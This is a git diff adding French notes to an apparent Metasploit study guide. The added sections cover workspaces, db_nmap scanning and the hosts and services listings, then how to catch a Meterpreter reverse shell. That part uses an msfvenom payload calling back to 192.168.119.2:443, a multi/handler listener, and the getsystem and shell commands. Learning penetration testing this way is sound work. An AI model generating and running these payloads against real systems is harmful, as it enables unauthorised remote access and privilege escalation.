@@ -170,7 +170,78 @@ run
 
 ## Workspaces
 
-Lorem Ipsum
+L'avantage d'avoir mis en place la base de données est que l'on va pouvoir utiliser les workspaces ! 
+Metasploit est capable de stocker toutes les informations que nous récoltons au cours d'un pentest.
+Lorsque nous relançons metasploit après un test d'intrusion, les informations existent toujours dans la base de données et risquent de se mélanger à de futures pentest.
+Pour éviter ce problème, on utilise les workspaces.
+
+La commande `workspace` permet de lister tous les workspaces existants.
+On peut passer d'un workspace à un autre en ajoutant son nom à la commande.
+Si on crée un nouveau workspace, on peut fournir son nom avec l'option `-a`.
+
+```sh
+msf6 > workspace
+* default
+
+msf6 > workspace -a workspace1
+[*] Added workspace: workspace1
+[*] Workspace: workspace1
+```
+
+Une fois crée, nous sommes automatiquement dans le workspace.
+
+Nous pouvons maintenant remplir la base de données.
+Premièrement, on utilise la commande `db_nmap` qui et wrapper qui exécute Nmap à l'intérieur de Metasploit et stocke les résultats. 
+
+```sh
+msf6 > db_nmap -A 192.168.45.202
+[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 03:48 EDT
+[*] Nmap: Nmap scan report for 192.168.45.202
+[*] Nmap: Host is up (0.11s latency).
+[*] Nmap: Not shown: 993 closed tcp ports (reset)
+[*] Nmap: PORT     STATE SERVICE       VERSION
+[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
+[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+[*] Nmap: 445/tcp  open  microsoft-ds?
+[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
+...
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 67.72 seconds
+```
+
+Pour lister les hôtes découverts, on tape la commande `hosts` :
+```sh
+msf6 > hosts
+
+Hosts
+=====
+
+address         mac  name  os_name       os_flavor  os_sp  purpose  info  comments
+-------         ---  ----  -------       ---------  -----  -------  ----  --------
+192.168.45.202             Windows 2016                    server
+```
+
+On peut aussi taper la commande `services` pour afficher les services découverts :
+```sh
+msf6 > services
+Services
+========
+
+host            port  proto  name           state  info
+----            ----  -----  ----           -----  ----
+192.168.45.202  135   tcp    msrpc          open   Microsoft Windows RPC
+192.168.45.202  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
+192.168.45.202  445   tcp    microsoft-ds   open
+192.168.45.202  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
+
+msf6 > services -p 3389
+Services
+========
+
+host            port  proto  name  state  info
+----            ----  -----  ----  -----  ----
+192.168.45.202  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
+
+```
 
 # Création de reverse-shell
 
@@ -216,4 +287,44 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -
 
 # Récupérer un reverse-shell avec Meterpreter
 
-Lorem Ipsum
+Il existe de nombreuses façons de récupérer un shell avec Meterpreter mais voici une méthode universelle.
+
+Premièrement, le payload créer doit être un payload `meterpreter`.
+Exemple : 
+```sh
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
+```
+
+Dans un second temps, lancer msfconsole et utiliser le module `multi/handler`.
+Ce module permet de récupérer n'importe quel type de shell, tant qu'il y a été conçu pour meterpreter.
+```sh
+use multi/handler
+```
+
+Il faut ensuite configurer les bonnes options afin de bien réceptionner le shell.
+Premièrement il faut configurer le même payload que pour le msfvenom : 
+```sh
+set PAYLOAD windows/x64/meterpreter_reverse_https
+```
+
+Ensuite, il faut configurer les options LHOST et LPORT :
+```sh
+set LHOST 192.168.119.2
+set LPORT 443
+```
+
+On lance maintenant le listener : 
+```sh
+run
+```
+
+Maintenant, nous n'avons plus qu'à lancer l'attaque vers la machine cible, et le multi/handler va récupérer la session !
+
+Une fois dans la session, on peut utiliser les commandes Meterpreter pour intergir avec la session. Parmi elle : 
+```sh
+shell # Pour obtenir un shell interactif
+getsystem # Pour obtenir les droits système si une faille connue le permet
+getuid # Pour obtenir l'UID de l'utilisateur courant
+```
+
+Pour aller plus loin : https://docs.metasploit.com 
